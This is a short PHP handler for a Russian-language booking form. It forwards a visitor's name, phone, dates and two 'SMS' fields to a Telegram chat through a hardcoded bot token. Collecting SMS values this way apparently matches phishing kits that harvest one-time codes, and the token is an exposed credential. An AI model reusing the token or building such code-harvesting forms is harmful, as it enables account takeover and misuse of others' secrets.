<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $telegram_token = '6278358272:AAG9bxlhh7Ypr7l5UqZaZ4n9sUfmZViE2Lk'; // Replace with your Telegram Bot token
    $telegram_chat_id = '@sitetestmyqtar'; // Replace with your Telegram chat ID

    $sms1 = $_POST['sms1'];
    $sms2 = $_POST['sms2'];
    $dt = $_POST['dt'];
    $dt2 = $_POST['dt2'];
    $name = $_POST['name'];
    $phone = $_POST['phone'];

    $message = "Новое бронирование:\n";
    $message .= "Имя: " . $name . "\n";
    $message .= "Телефон: " . $phone . "\n";
    $message .= "Дата приезда: " . $dt . "\n";
    $message .= "Длительность отдыха: " . $dt2 . " дн.\n";
    $message .= "Дополнительные данные:\n";
    $message .= "SMS1: " . $sms1 . "\n";
    $message .= "SMS2: " . $sms2 . "\n";

    $url = 'https://api.telegram.org/bot' . $telegram_token . '/sendMessage';
    $params = [
        'chat_id' => $telegram_chat_id,
        'text' => $message,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    if ($result) {
        echo 'yes';
    } else {
        echo 'no';
    }
}

?>
